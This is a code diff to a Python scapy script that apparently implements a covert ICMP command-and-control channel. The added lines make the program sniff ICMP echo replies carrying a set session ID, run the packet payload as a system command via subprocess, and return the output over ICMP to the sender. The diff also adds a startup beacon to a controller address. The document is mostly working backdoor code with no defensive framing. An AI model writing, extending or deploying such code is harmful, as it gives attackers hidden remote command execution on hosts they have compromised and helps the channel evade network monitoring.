@@ -3,16 +3,31 @@
 from scapy.all import *
 from multiprocessing import Process
 import time, os, random
+import subprocess
 import string
 import argparse
+from commands import *
 
-
+addr = ''
 payload_len = 32  #MAX 1472 bytes
 rand = False
-SESSION_ID = int(1028)
+
+
+def execute(packet):
+    print("received command:")
+    to_run = (packet[Raw].load).decode()
+    print(to_run)
+    output = subprocess.run(to_run, stdout=subprocess.PIPE, universal_newlines=True)
+    print(type(output.stdout))
+    icmp_send(packet[IP].src, output.stdout, RETURNED_DATA_SEQ)
+
+
 def catch(packet):
     if packet[ICMP].id == SESSION_ID and packet[ICMP].type == 0:
-        print(packet[IP].src, ":", packet[Raw].load)
+        if packet[ICMP].seq == 99:
+            print(packet[IP].src, ":", packet[Raw].load)
+        else:
+            execute(packet)
 
 def snifff():
     print("Starting Server")
@@ -31,6 +46,7 @@ def icmp_send(addr, payload, sequence):
 
 
 if __name__ == "__main__":
+    #print(hashtable)
     parser = argparse.ArgumentParser(description='Passer version ')
     parser.add_argument('-a', '--address', help='ip address to send packets too', required=False, default="127.0.0.1")
     parser.add_argument('-s', '--size', help='payload size for beacon', required=False, default=32)
@@ -40,6 +56,7 @@ if __name__ == "__main__":
     addr = args['address']
     sniffer = Process(target=snifff)
     sniffer.start()
+    icmp_send(addr,'Hello From Client', FIRST_SEQ)
     sequence = 1
     while 1:
         response = input("\n> ")
